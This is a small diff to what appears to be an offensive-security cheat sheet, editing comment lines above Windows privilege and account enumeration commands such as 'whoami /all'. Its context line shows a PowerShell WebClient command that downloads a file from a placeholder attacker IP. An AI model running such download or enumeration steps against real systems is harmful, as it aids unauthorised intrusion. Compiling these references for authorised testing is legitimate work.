@@ -785,9 +785,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRES
 ```bash
 # Windows Enumeration Commands
 
-# CMD
-
-#Check the privileges
+# Eumerate privileges
 whoami /all
 
 # Enumerate all local accounts
